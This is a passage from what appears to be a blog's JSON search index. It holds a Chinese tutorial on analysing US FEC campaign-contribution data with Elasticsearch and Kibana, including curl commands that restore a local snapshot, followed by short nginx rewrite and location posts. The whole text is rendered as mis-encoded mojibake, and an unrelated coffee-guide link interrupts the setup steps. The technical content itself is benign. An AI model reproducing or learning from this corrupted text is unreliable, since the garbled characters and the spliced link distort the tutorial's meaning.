å¯ä»¥æŠŠå®ƒæ·»åŠ åˆ° Dashboard é‡Œã€‚å¦‚æœä½ åœ¨æ•°æ®å¯è§†åŒ–æ–¹é¢æœ‰è¿‡ä¸€äº›ç»éªŒï¼Œä½ å¯èƒ½ä¼šæƒ³â€œè¿™å®¶è¯çœŸæ˜¯ä¸ªçº¯ç å†œã€‚é¥¼å›¾åœ¨è¿™ç§æ•°æ®åˆ†æé‡Œå°±æ˜¯ä¸€ä¸ªé”™è¯¯çš„å¯è§†åŒ–æ–¹å¼ã€‚â€å—¯ï¼Œä½ æ˜¯å¯¹çš„(å¥½å§ï¼Œå¸Œæœ›ä¸åŒ…æ‹¬çº¯ç å†œéƒ¨åˆ†)ã€‚è¿™é‡Œä½¿ç”¨é¥¼å›¾ç¡®å®ç»™è§‚ä¼—å¸¦æ¥ä¸€äº›å¤±çœŸçš„æ„Ÿè§‚ï¼Œå¥½åƒè¿™é‡Œé¢å·²ç»åŒ…æ‹¬å…¨éƒ¨ 100% çš„æ•°æ®ï¼Œå°±å¥½åƒåŠ åˆ©ç¦å°¼äºšçš„ç°é‡‘å åˆ°å…¨å›½çš„å››åˆ†ä¹‹ä¸€ä¸€æ ·ã€‚ä½ å¯ä»¥ä¿®æ”¹ â€œsizeâ€ å‚æ•°ä¸º â€œ51â€ï¼Œè¿™æ ·åˆ†ç‰‡æ•°å°±ç­‰äºå®é™…çš„æ€»æ•°ã€‚ä¸è¿‡å¦‚ä¸‹æ‰€ç¤ºï¼Œé¥¼å›¾çœ‹èµ·æ¥å°±ä¸æ€ä¹ˆæ¼‚äº®äº†ï¼šæ›´å¥½çš„åŠæ³•æ˜¯ç”¨å¦ä¸€ç§å¯è§†åŒ–æ–¹å¼ï¼Œæ¯”å¦‚å‚ç›´æŸ±çŠ¶å›¾(Vertical Bar Chart)ã€‚åˆ›å»ºå‚ç›´æŸ±çŠ¶å›¾çš„å‚æ•°çœ‹èµ·æ¥å¾ˆçœ¼ç†Ÿã€‚å› ä¸ºè¿™äº›è·Ÿå‰é¢åˆ›å»ºé¥¼å›¾ç”¨è¿‡çš„ä¸€æ¨¡ä¸€æ ·ï¼Œæ¯•ç«Ÿé©±åŠ¨å¯è§†åŒ–çš„èƒŒåï¼Œå®é™…çš„è¯·æ±‚å°±æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ã€‚æˆ‘ä»¬åªæ˜¯ç”¨ä¸€ç§æ›´ä¸å®¹æ˜“è¢«è¯¯è§£çš„æ–¹å¼æ¥å±•ç¤ºè€Œå·²ã€‚dashboardåˆ›å»ºå¯è§†åŒ–æ˜¯è›®æœ‰è¶£çš„ï¼Œä¸è¿‡æœ‰æ—¶å€™ï¼Œä½ æ›´å¸Œæœ›æŠŠè¿™äº›åˆèµ·æ¥æ”¾è¿›ä¸€ä¸ªæ¼‚äº®çš„ä»ªè¡¨æ¿ä¸Šï¼Œåœ¨è¿™ä¸Šé¢ï¼Œæ‰§è¡Œä¸€äº›èšåˆåˆ†æï¼Œé€šè¿‡å¤šç»´åº¦çš„å­—æ®µæ•°æ®è·å–æœ‰ç”¨çš„ç»“è®ºï¼Œç„¶åå’Œåˆ«äººåˆ†äº«ä½ çš„å‘ç°ã€‚æ·»åŠ å¯è§†åŒ–åˆ°ä»ªè¡¨æ¿çš„æ—¶é—´è¿‡ç¨‹éå¸¸ç›´æ¥ã€‚ä½ åˆ›å»ºå¥½ä¸€ç³»åˆ—å¯è§†åŒ–åï¼Œåœ¨ Dashboard æ ‡ç­¾é¡µçš„å³ä¸Šè§’ç‚¹å‡» Add Visualizatioin å›¾è¡¨ï¼Œç„¶åå¼€å§‹æ·»åŠ å³å¯ï¼å°è´´å£«ï¼šåœ¨ä½ å»åˆ›å»ºå¯è§†åŒ–å’Œä»ªè¡¨æ¿ä¹‹å‰ï¼Œæœ€å¥½å…ˆçº¦å®šä¿å­˜è¿™äº›å…ƒç´ æ—¶é‡‡ç”¨ä»€ä¹ˆå‘½åè§„åˆ™ã€‚æ¯”å¦‚ï¼Œç»Ÿä¸€åŠ ä¸Šä½ çš„ Elasticsearch ç´¢å¼•åæˆ–è€…ç±»å‹åä½œä¸ºå‰ç¼€ã€‚ç„¶åï¼Œä½ å°±ä¼šæœ‰ä¸€ä¸ªåƒè¿™æ ·çš„ä»ªè¡¨æ¿äº†ï¼šæ¢ç´¢è®©æˆ‘ä»¬å†çœ‹ä¸¤ä¸ªæ½œåœ¨çš„æ•°æ®åœºæ™¯ï¼šä¸€ä¸ªå…³æ³¨ç‰¹å®šçš„ Super PACï¼Œå¦ä¸€ä¸ªå…³æ³¨ä½ åŠ è¡€çš„ç«é€‰çŒ®é‡‘ã€‚**è¿™äº› pac åé¢éƒ½æœ‰è°?**æ”¿æ²»è¡ŒåŠ¨å§”å‘˜ä¼š(Political Action Committees), æˆ–è€…è¯´ PACï¼Œä¸æ˜¯ä»€ä¹ˆæ–°ä¸œè¥¿äº†ã€‚ç¬¬ä¸€ä¸ª PAC åœ¨ 1947 å¹´ã€Šå¡”å¤«è„±-å“ˆç‰¹åˆ©æ³•æ¡ˆã€‹ç¦æ­¢å·¥ä¼šå’Œä¼ä¸šèŠ±é’±å½±å“è”é‚¦é€‰ä¸¾çš„æ—¶å€™å°±æˆç«‹çš„ã€‚Super PACs åº”è¯¥æ˜¯ç”± 2010 å¹´çš„ä¸¤ä¸ªæœ€é«˜æ³•é™¢åˆ¤å†³ä¿ƒç”Ÿçš„ã€‚åˆ¤å†³è£å®šæ²¡æœ‰æé’±ç»™å…·ä½“å€™é€‰äººï¼Œæ”¿å…šæˆ–å…¶ä»– PAC çš„ PAC ç»„ç»‡ï¼Œå¯ä»¥æ¥æ”¶æ¥è‡ªä¸ªäººï¼Œå…¬ä¼šå’Œä¼ä¸š(åŒ…æ‹¬ç›ˆåˆ©å’Œéç›ˆåˆ©çš„)çš„æ— é™é¢ææ¬¾ä»¥ä¿è¯ç‹¬ç«‹çš„æ”¯å‡ºã€‚[http://en.wikipedia.org/wiki/Political_action_committee]Super PACs æ˜¯å¾ˆå¤šäº‰è®®å’Œè¾©è®ºçš„æ¥æºï¼Œå› ä¸ºåœ¨æ­¤ä¹‹å‰ï¼Œç«é€‰çŒ®é‡‘æœ‰å¾ˆæ˜ç¡®çš„é¢åº¦é™åˆ¶ã€‚åœ¨ä¸Šé¢æˆªå›¾é‡Œï¼Œæˆ‘ä»¬çœ‹åˆ°äº†ä¸€ä¸ªæœ‰å…³æçŒ®çš„é«˜å±‚æ¬¡çš„å¸ˆå¾’ã€‚ç‰¹åˆ«æ˜¯ï¼Œæ¥æ”¶æçŒ®çš„é¡¶çº§å§”å‘˜ä¼šï¼Œå§”å‘˜ä¼šç±»å‹(æ¯”å¦‚ï¼šSuper PACï¼Œ PACï¼Œå…šæ´¾ç­‰)ä»¥åŠåˆ©ç›Šé›†å›¢çš„ç±»åˆ«(æ¯”å¦‚ï¼šå…¬å¸ï¼Œå…¬ä¼šç­‰)ã€‚æˆ‘å¯ä»¥å¤§æ¦‚çŒœå‡ºæ¥å¾ˆå¤šå§”å‘˜ä¼šçš„å«ä¹‰ï¼Œä¸è¿‡è¿˜æ˜¯æœ‰äº›ä¸å¤ªæ˜æ˜¾ â€”â€” æ¯”å¦‚ â€œACTBLUEâ€ å’Œ â€œNEXTGEN CLIMATE ACTION COMMITTEEâ€ã€‚è¶…è¿‡ ä¸ƒåƒä¸ƒç™¾ä¸‡ç¾å…ƒçš„çŒ®é‡‘æç»™ä¸€ä¸ªå‘½åæ¨¡ç³Šä¸æ¸…çš„å§”å‘˜ä¼šï¼ŒçœŸçš„æ˜¯ä¸€ä¸ªå€¼å¾—ç ”ç©¶çš„é—®é¢˜ã€‚ä½ å¯ä»¥åœ¨æ•°æ®è¡¨æ ¼ä¸Šç‚¹å‡»å…ƒç´ ï¼Œå°±èƒ½è¿‡æ»¤è¿™ä¸ªæ•°æ®é›†äº†ï¼šç‚¹å‡» â€œNEXTGEN CLIMATE ACTION COMMITTEEâ€ åï¼ŒKibana ä¼šåˆ·æ–°æ‰€æœ‰å…¶ä»–å›¾æ ‡ï¼Œåªæ˜¾ç¤ºæçŒ®ç»™è¿™ä¸ªå§”å‘˜ä¼šçš„ç›¸å…³æ•°æ®ã€‚æˆ‘ä»¬ç«‹åˆ»å°±å‘ç°äº†ä¸€äº›æœ‰è¶£çš„ç°è±¡ï¼šç»å¤§å¤šæ•°æçŒ®ç»™ â€œNEXTGEN CLIMATE ACTION COMMITTEEâ€ çš„äººæ˜¯ï¼šè‡ªç§°èŒä½æ˜¯â€œåˆ›å§‹äººâ€é›‡ä¸»ä¸º Fahr, LLCå±…ä½åœ¨æ—§é‡‘å±±ä½ å†ç‚¹å‡» â€œFAHR, LLCâ€ ç»§ç»­é’»å–ï¼Œå¾ˆæ˜æ˜¾è¿™äº›çŒ®é‡‘æ˜¯æ¥è‡ªåŒä¸€ä¸ªäººï¼šåœ¨é€šè¿‡é›‡ä¸»ä¸‹é’»ä¹‹å‰ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°åªæœ‰ 56 ç¬”çŒ®é‡‘ç»™ â€œNEXTGEN CLIMATE ACTION COMMITTEEâ€ã€‚å‡ æ¬¡ç‚¹å‡»åï¼Œæˆ‘ä»¬å‘ç°è¿™ä¸ª Super PAC åŸºæœ¬éƒ½æ˜¯ä» 1 ä¸ªäººä»¥åŠå…¶ä»–æå°‘æ•°äººé‚£è·å–çš„èµ„é‡‘ï¼Œæˆ‘ä»¬çŒœæµ‹è¿™ç¾¤äººå¯èƒ½æ˜¯æœ‹å‹ï¼ŒåŒäº‹æˆ–è€…å…¶ä»–å…³ç³»ã€‚è€Œå¦ä¸€ä¸ªå¤§å‹ PAC, â€œACTBLUEâ€ï¼Œå°±å®Œå…¨ä¸ä¸€æ ·äº†ã€‚ç»™è¿™ä¸ª PAC çš„æçŒ®éå¸¸å¤š(è·Ÿä¸Šä¸ªæ¯”æ˜¯ 154448 vs 56)ï¼Œè€Œä¸”æçŒ®æ¥æºå¹¿æ³›åˆ†å¸ƒåœ¨å„ä¸ªåœ°åŸŸï¼šElasticsearch æä¾›çš„ä¸€ä¸ªæ›´æœ‰è¶£çš„åˆ†æå‡½æ•°æ˜¯å…³é”®è¯èšåˆ(significant terms aggregation)ã€‚ä½ å¯ä»¥åœ¨æ¯”å¦‚æ¬ºè¯ˆæ£€æµ‹ã€å¼‚å¸¸æ£€æµ‹ã€æ¨èç­‰å„æ–¹é¢ä½¿ç”¨å…³é”®è¯ã€‚Elasticsearch å®˜åšä¸Šæœ‰ä¸€ç¯‡æ–‡ç« ä»‹ç»è¿™ä¸ªï¼šhttp://www.elasticsearch.org/blog/significant-terms-aggregation/.å¯¹äºç«é€‰çŒ®é‡‘æ•°æ®é›†ï¼Œä½¿ç”¨å…³é”®è¯çš„ä¸€ä¸ªä¾‹å­å°±æ˜¯è¯†åˆ«ä¸€ä¸ªç‰¹å®šçš„æŸ¥è¯¢çš„ç»Ÿè®¡ç‰¹å¾ã€‚æ¯”å¦‚è¯´ï¼Œåœ¨å¾ˆå¤š PAC é‡Œï¼ŒæçŒ®è€…çš„èŒä¸šæ˜¯å¾‹å¸ˆã€é€€ä¼‘ã€æ³•å®˜ã€‚æ‰€ä»¥ï¼Œå¯¹ä»»ä¸€ PAC åšèŒä¸šæ’è¡Œç»Ÿè®¡ï¼Œéƒ½å‘ç°ä¸äº†ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚è€Œä½¿ç”¨å…³é”®è¯èšåˆï¼Œæ­£å¦‚åœ¨è¡¨æ ¼ä¸­åšçš„ï¼Œå¯ä»¥çœ‹åˆ°å¯¹äº ActBlueï¼ŒèŒä½æ›´æ™®éçš„åº”è¯¥æ˜¯æ•™æˆã€è‡ªç”±èŒä¸šå’Œä½œå®¶ã€‚æˆ‘ä»¬å¯ä»¥è¿‡æ»¤å¦ä¸€ä¸ª PACï¼Œæ°‘ä¸»å…šå…¨å›½å§”å‘˜ä¼š(Democratic National Committee)ï¼Œä¼šå‘ç°è¿™ä¸ª PAC çš„èŒä½éƒ½å¾ˆå¸¸è§äº†ï¼šè™½ç„¶æˆ‘ä»¬å¼€å§‹çš„è¿™æ¬¡æ¢ç´¢æ²¡æœ‰å›ç­”å‡ºå…³äºè¿™äº› PAC çš„æ‰€æœ‰é—®é¢˜ï¼Œå®ƒè§¦å‘äº†æˆ‘å¸Œæœ›è·Ÿè¸ªçš„æ›´å¤šé—®é¢˜ï¼šè°æ˜¯ Thomas Steyer ï¼Œä»–è·Ÿä»–çš„ Super PAC çš„å¦å¤–å¤§æ¦‚ 40 åˆ° 50 ä¸ªæçŒ®è€…ä¹‹é—´æ˜¯ä»€ä¹ˆå…³ç³»ï¼ŸNextGen Climate å’Œ ActBlue æ”¯æŒå“ªä¸ªå€™é€‰äººï¼Ÿè¿™ä¸¤ä¸ªç»„ç»‡ä¹‹é—´æœ‰ä»€ä¹ˆå…³è”ï¼Ÿæœ‰æ²¡æœ‰ä»€ä¹ˆæœ‰æ„æ— æ„çš„å¸®åŠ©ç‰¹å®š PAC çš„è¥é”€æ‰‹æ®µï¼Œè®©ç‰¹å®šè¡Œä¸šçš„é›‡å‘˜æ›´æœ‰å…´è¶£ï¼Ÿæ•´ä¸ªé’»å–è¿‡ç¨‹çš„ä¼˜ç‚¹æ˜¯ï¼šåœ¨å¸®åŠ©å›ç­”ä¸€äº›é—®é¢˜çš„æ—¶å€™ï¼Œç”¨ ELK stack è¿˜èƒ½å¸®ä½ åˆ¶å®šå‡ºä¸€äº›ç”šè‡³ä½ è‡ªå·±éƒ½æ²¡æƒ³åˆ°èƒ½é—®å‡ºæ¥çš„é—®é¢˜!**æˆ‘å®¶ä¹¡çš„äººæŠŠé’±ç»™è°äº†ï¼Ÿ*è­¦å‘Šï¼šæ ¹æ®ä½ å®¶ä¹¡çš„å¤§å°ï¼Œä½ å¯èƒ½ä¼šå‘ç°ä¸€äº›è®©ä½ é‚»å±…å¾ˆå°´å°¬çš„äº‹æƒ…:)æ‰€æœ‰è¶…è¿‡ $200 çš„çŒ®é‡‘éƒ½è¢«è¦æ±‚ä¾æ³•å…¬å¼€ï¼Œæ‰€ä»¥ï¼Œè™½ç„¶åœ¨è¿™é‡Œçœ‹åˆ°ä½ é‚»å±…çš„ä¿¡æ¯å¯èƒ½æ¯”è¾ƒå°´å°¬ï¼Œä¸è¿‡ç«é€‰å¿çº§æ˜¯å…¬ä¼—ä¿¡æ¯ï¼Œå…¬ä¼—æ˜¯æœ‰è¿™ä¸ªåˆæ³•çŸ¥æƒ…æƒçš„ã€‚ä½ å¯ä»¥å¾ˆå¿«çš„é’»å–æ•°æ®é›†åˆ°å·ã€å¸‚ï¼Œç„¶åçœ‹åˆ°ä½ å®¶ä¹¡è°æçŒ®äº†ï¼Œæç»™äº†è°ã€‚æ–°æ³½è¥¿çš„éœåšè‚¯åªæœ‰ 449 æ¡è®°å½•ï¼Œé€ä¸€ç¿»é˜…è®°å½•ä¹ŸèŠ±ä¸äº†å¤šå°‘æ—¶é—´ã€‚ä½†æ˜¯ï¼Œå¦‚æœä½ è¦åˆ†æçš„æ˜¯çº½çº¦å¸‚çš„ 70850 æ¡è®°å½•ï¼Œé€šè¿‡ ELK stack æä¾›çš„äº¤äº’å¼ç”¨æˆ·ä½“ç°å°±ä½“ç°å‡ºæ˜æ˜¾ä¼˜åŠ¿äº†ï¼šå›åˆ°æˆ‘çš„å®¶ä¹¡ï¼Œæ–°æ³½è¥¿çš„éœåšè‚¯ï¼Œé€šè¿‡å‡ æ¬¡ç‚¹å‡»ï¼Œä½ å°±å¯ä»¥æ„å»ºå‡ºä¸ºå½“åœ°å‚è®®é™¢å’Œä¼—è®®é™¢ç«é€‰æçŒ®çš„æ’è¡Œæ¦œã€‚æˆ‘ä¸€ç›´ä¸å¤ªæ˜ç™½ä¸ºä»€ä¹ˆäººä»¬è¦å‡ºé’±ç»™ Cory Booker(èµ¢å¾— 56% é€‰ç¥¨)å’Œ Albio Sires(èµ¢å¾— 77.3% é€‰ç¥¨)å‚ä¸çš„éç«äº‰æ€§çš„æ¯”èµ›ã€‚æˆ–è€…åªæ˜¯å› ä¸ºéœ€è¦æ”¯æŒä¸€ä¸‹æœ‹å‹ï¼Ÿä¸è¿‡ä¸€ä¸ªå…³å¿ƒæ”¿æ²»çš„äººï¼Œå¯èƒ½å°±ä¼šç•™æ„è¿™é‡Œé¢çš„æ¯ä¸€ä¸ªç»†èŠ‚äº†ã€‚æ€»ç»“æˆ‘ä»¬åˆšçœ‹è¿‡äº†ç”¨ ELKstack æ¢ç´¢ FEC ç«é€‰çŒ®é‡‘æ•°æ®èƒ½åšåˆ°ä»€ä¹ˆã€‚å¸Œæœ›è¿™ä¹Ÿèƒ½å¸®ä½ æ‰©å±•ä½¿ç”¨ ELKstack çš„æ€è·¯ï¼Œåº”ç”¨è¿™äº›æ•°æ®å‘ç°çš„è§„åˆ™åˆ°å…¶ä»–ç±»å‹çš„æ•°æ®æ˜¯ï¼Œä¸ç®¡æ˜¯ç»“æ„åŒ–çš„æ¯”å¦‚äº‹åŠ¡æ•°æ®ï¼Œéç»“æ„åŒ–çš„æ¯”å¦‚çº¯æ–‡æœ¬æ•°æ®ï¼ŒæŠ‘æˆ–äºŒè€…çš„æ··åˆä½“ã€‚ä¸ªäººã€éè¥åˆ©ç»„ç»‡ã€æ”¿åºœæœºæ„å’Œç§äººå…¬å¸ï¼Œä»åˆåˆ›å…¬å¸åˆ°å¤§å‹ä¼ä¸šï¼Œéƒ½åœ¨ä½¿ç”¨ ELK stack å¤„ç†å®æ—¶æ•°æ®é›†ï¼Œå¤§å°ä»å‡  MB åˆ°å‡  PBï¼Œéšç€ Kibana 4 çš„å‘å¸ƒï¼Œå¤„ç†ä¼šå˜å¾—æ›´å®¹æ˜“å’Œæ›´å¼ºå¤§ã€‚é™„å½• a. å¦‚ä½•åœ¨ç¬”è®°æœ¬ç”µè„‘ä¸Šè¿è¡Œ elk åˆ†ææœ¬æ•°æ®é›†å¦‚æœä½ è¿˜æ²¡æœ‰æœ€æ–°ç‰ˆçš„ ELK stack çš„è¯ï¼Œå¯ä»¥ä»http://www.elasticsearch.org/overview/elkdownloads/ é¡µé¢ä¸Šä¸‹è½½å¹¶ä¾ç…§è¯¥é¡µè¯´æ˜è¿›è¡Œå®‰è£…ã€‚å®é™…ä¸Šä½ å¹¶ä¸ä¸€å®šéœ€è¦ Logstash æ¥å®Œæˆè¿™ä»¶äº‹æƒ…ï¼Œä¸è¿‡ä½ å¦‚æœæƒ³è°ƒè¯•ä¸€æŠŠ Logstash é…ç½®ç„¶åè‡ªå·±åŠ è½½åŸå§‹æ•°æ®ï¼Œå®‰è£… Logstash è¿˜æ˜¯å®Œå…¨å€¼å¾—çš„ã€‚æ¢å¤ elasticsearch ç´¢å¼•é•œåƒä¸‹è½½å®‰è£…å®Œ ELK stack åï¼Œä½ éœ€è¦ä¸‹è½½çŒ®é‡‘æ•°æ®çš„ç´¢å¼•é•œåƒæ–‡ä»¶(æ³¨æ„ï¼šè¿™æ˜¯ä¸€ä¸ª 1.4GB å¤§çš„æ–‡ä»¶ï¼Œå°å¿ƒä½ çš„æ‰‹æœºæµé‡):http://download.elasticsearch.org/demos/usfec/snapshot_demo_usfec.tar.gzåœ¨ä½ æœ¬åœ°ç£ç›˜ä¸Šåˆ›å»ºä¸€ä¸ªå« snapshots çš„æ–‡ä»¶å¤¹ï¼Œç„¶åè§£å‹ä¸‹è½½çš„ .tar.gz æ–‡ä»¶è¿›å»ã€‚æ¯”å¦‚ï¼šmkdir -p ~/elk/snapshotscp ~/Downloads/snapshot_demo_usfec.tar.gz ~/elk/snapshotscd ~/elk/snapshotstar xf snapshot_demo_usfec.tar.gzç­‰ä½ æŠŠ Elasticsearch è·‘èµ·æ¥ä»¥åï¼Œæ¢å¤ç´¢å¼•å°±åªéœ€è¦ä¸¤æ­¥äº†ï¼š1) ä¸ºé•œåƒæ³¨å†Œä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä»“åº“(ä¿®æ”¹ä¸‹ä¾‹ä¸­ â€œlocationâ€ çš„å€¼åˆ°ä½ å®é™…çš„ usfec é•œåƒç›®å½•):curl -XPUT â€˜http://localhost:9200/_snapshot/usfecâ€™ -d â€˜{â€œtypeâ€: â€œfsâ€,â€œsettingsâ€: {â€œlocationâ€: â€œ/tmp/snapshots/usfecâ€,â€œcompressâ€: true,â€œmax_snapshot_bytes_per_secâ€: â€œ1000mbâ€,â€œmax_restore_bytes_per_secâ€: â€œ1000mbâ€}}â€™2) è°ƒç”¨æ¢å¤æ¥å£(Restore API endpoint)å¼€å§‹æ¢å¤ç´¢å¼•æ•°æ®åˆ°ä½ çš„ Elasticsearch å®ä¾‹:curl -XPOST â€œlocalhost:9200/_snapshot/usfec/1/_restoreâ€ç°åœ¨ï¼Œå»https://bluebottlecoffee.com/preparation-guidesã€‚ç­‰ä¸€ä¼šå„¿åï¼Œä½ å¯ä»¥è°ƒç”¨ cat recovery API æ¥æ£€æŸ¥ä¸€ä¸‹æ¢å¤æ“ä½œæ˜¯å¦å®Œæˆï¼šcurl -XGET â€˜localhost:9200/_cat/recovery?vâ€™æˆ–è€…è·å–ç´¢å¼•çš„æ–‡æ¡£æ•°ï¼šcurl -XGET localhost:9200/usfec/_count -d â€˜{â€œqueryâ€: {â€œmatch_allâ€: {}}}â€™å¦‚æœå…¨éƒ¨å®Œæˆçš„è¯ï¼Œè¿™ä¸ªæ•°åº”è¯¥æ˜¯ 4250251ã€‚æŒ‡å‘ kibana 4 åˆ°ä¸€ä¸ª elasticsearch ç´¢å¼•ä½ é€šè¿‡ localhost:5601 ç¬¬ä¸€æ¬¡è®¿é—® Kibana çš„æ—¶å€™ï¼Œå®ƒä¼šè¦æ±‚ä½ å®šä¹‰ä¸€ä¸ª â€œindex patternâ€:å› ä¸º Elasticsearch é›†ç¾¤å¯èƒ½æœ‰å¤šä¸ªç´¢å¼•ï¼Œä½ éœ€è¦å‘Šè¯‰ Kibana å“ªäº›ç´¢å¼•é‡Œæœ‰ä½ å¸Œæœ›è¯»å–çš„æ•°æ®ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼ŒçŒ®é‡‘é•œåƒåŒ…æ‹¬äº†å››ä¸ªç´¢å¼•ï¼Œå½“ä½ è¿è¡Œç´¢å¼•æ¢å¤æ“ä½œåï¼Œåº”è¯¥åœ¨ä½ çš„ Elasticsearch å®ä¾‹é‡Œåˆ›å»ºå¥½äº†å››ä¸ªæ–°ç´¢å¼•ï¼šusfec_indiv_contrib: ç”±ä¸ªäººæèµ ç»™å§”å‘˜ä¼šusfec_comm2cand_contrib: ç”±å§”å‘˜ä¼šæèµ ç»™å€™é€‰äººusfec_comm2comm_contrib: ç”±å§”å‘˜ä¼šè½¬ç»™å…¶ä»–å§”å‘˜ä¼šusfec_oppexp: å§”å‘˜ä¼šè¿è¥æ”¯å‡ºä½ å¯ä»¥è¾“å…¥ä¸€ä¸ªç´¢å¼•åå­—åˆ°è¾“å…¥æ¡†ï¼Œç„¶åé€‰æ‹©ä¸€ä¸ªæ—¶é—´å­—æ®µ(æˆ‘ä»¬ç´¢å¼•é‡Œï¼Œåº”è¯¥æ˜¯ @timestamp)ï¼Œç„¶åç‚¹å‡» Createï¼šè¿™ç¯‡åšæ–‡çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬åªç”¨åˆ°äº†ä¸ªäººçŒ®é‡‘çš„æ•°æ®ï¼Œå…¶ä»–ä¸‰ä¸ªç´¢å¼•é‡Œå…¶å®è¿˜æœ‰å¾ˆå¤šä»·å€¼ã€‚ç”šè‡³ä½ å¯ä»¥åœ¨ Kibana é‡ŒåŒæ—¶æŒ‡å‘è¿™å››ä¸ªç´¢å¼•ï¼Œç„¶åæ‰¾å‡ºä¸åŒæ•°æ®é›†ä¹‹é—´çš„è”ç³»ï¼æ‰“å¼€ Discover æ ‡ç­¾ï¼Œé€‰æ‹©ä¸€ä¸ªåˆé€‚çš„æ—¶é—´æ®µ(é€‰æ‹© â€œFromâ€ æ—¶é—´ä¸º 2012-12-18)ï¼Œå¼€å§‹æ¢ç´¢å§ï¼é™„å½• b. å‚è€ƒé“¾æ¥fec.gov çš„åŸå§‹æ•°æ®å’Œæ•°æ®å­—å…¸æ–‡ä»¶http://www.fec.gov/finance/disclosure/ftpdet.shtml#a2013_2014OpenSecrets.org èµ„æºä¸­å¿ƒ: åˆ†æçŒ®é‡‘æ•°æ®çš„å„ç§èµ„æºã€‚æ„Ÿè°¢è¿™é‡Œæä¾›äº† FEC æ•°æ®æ›´è¯¦ç»†çš„å­—å…¸ã€‚https://www.opensecrets.org/resources/create/å­˜æ”¾æ–‡ä»¶çš„ Github ä»“åº“: Logstash é…ç½®, ç´¢å¼•æ¨¡æ¿, è§£ææ•°æ®åˆ›å»º JSON çš„ Python è„šæœ¬ç­‰https://github.com/elasticsearch/demo/tree/master/usfec","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"kibana","slug":"kibana","permalink":"https://wangxiuwen.github.io/tags/kibana/"}],"author":"wangxiuwen"},{"title":"nginx é…ç½® rewrite è·³è½¬","slug":"history/tech/5953c4d0c2b92f5665eed9e8","date":"2016-01-07T04:05:17.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9e8/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9e8/","excerpt":"","text":"åœ¨è®¿é—® test.com ç½‘ç«™æ—¶ï¼Œä¼šè‡ªåŠ¨è·³è½¬åˆ° www.test.com ï¼Œè¿™æ˜¯å› ä¸ºè¯¥ç½‘ç«™åšäº† URL rewrite é‡å®šå‘ï¼Œä¸€èˆ¬ç½‘é¡µé‡å®šå‘è·³è½¬åˆ†ä¸ºä¸¤ç§ï¼Œ301 å’Œ 302 ï¼›301ï¼Œ302 éƒ½æ˜¯HTTPçŠ¶æ€çš„ç¼–ç ï¼Œéƒ½ä»£è¡¨ç€æŸä¸ªURLå‘ç”Ÿäº†è½¬ç§»ï¼Œä¸åŒä¹‹å¤„åœ¨äºï¼š301redirect: 301 ä»£è¡¨æ°¸ä¹…æ€§è½¬ç§»(Permanently Moved)ã€‚302 redirect: 302 ä»£è¡¨æš‚æ—¶æ€§è½¬ç§»(Temporarily Moved )ã€‚nginx ä¸­é…ç½® 301 å’Œ 302 è·³è½¬çš„æ–¹æ³•å¦‚ä¸‹ï¼šserver {listen 80;server_name www.test.com test.com;if (host != \"www.test.com\" ) { rewrite ^/(.*) http://www.test.com/$1 permanent; è‹¥æ”¹ permanent ä¸º redirect ï¼› åˆ™å‘ç”Ÿçš„æ˜¯ 302 è·³è½¬}}","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nginx","slug":"nginx","permalink":"https://wangxiuwen.github.io/tags/nginx/"}],"author":"wangxiuwen"},{"title":"Nginxåº”ç”¨-Locationè·¯ç”±åå‘ä»£ç†åŠé‡å†™ç­–ç•¥","slug":"history/tech/5953c4d0c2b92f5665eed9e9","date":"2016-01-07T03:25:16.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9e9/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9e9/","excerpt":"","text":"ä¸€ã€Nginxçš„åå‘ä»£ç†çš„è·¯ç”±ç­–ç•¥Nginxæ˜¯è‘—åçš„é«˜æ€§èƒ½WebæœåŠ¡å™¨ï¼Œåº”ç”¨åœ¨å¾ˆå¤šWebæœåŠ¡é¢†åŸŸï¼ŒåŒæ—¶å¼€å‘å’Œéƒ¨ç½²è¿‡ç¨‹ä¸­ï¼Œä¸ºäº†æ›´å¥½çš„æ§åˆ¶æ¥å£APIï¼ˆæˆ–æ˜¯WebServiceï¼‰ï¼Œæˆ‘ä»¬éœ€è¦ä¸¥æ ¼çš„æˆ–æ˜¯è°¨æ…çš„è§„åˆ’URLçš„ä½¿ç”¨ï¼Œè¿™æ ·æ‰èƒ½ä¸ºä»¥åçš„æ‰©å¼ ã€è¿­ä»£æ‰“ä¸‹è‰¯å¥½çš„åŸºç¡€ï¼Œå¦åˆ™æ‚ä¹±æ— ç« çš„URLä½¿ç”¨ï¼Œå°†æ˜¯ä»¥åå¤§è§„æ¨¡æ‰©å±•çš„å™©æ¢¦ã€‚Locationçš„é…ç½®è¯­æ³•è§„åˆ™ï¼šlocation /uri/ {â€¦}è¯­æ³•è¯´æ˜ï¼š= å¼€å¤´è¡¨ç¤ºç²¾ç¡®åŒ¹é…ï¼Œä¸æ”¯æŒæ­£åˆ™ã€‚^~ å¼€å¤´è¡¨ç¤ºuriä»¥æŸä¸ªå¸¸è§„å­—ç¬¦ä¸²å¼€å¤´ï¼Œä¸æ”¯æŒæ­£åˆ™ï¼Œç†è§£ä¸ºåŒ¹é…urlè·¯å¾„å³å¯ã€‚nginxä¸å¯¹urlåšç¼–ç 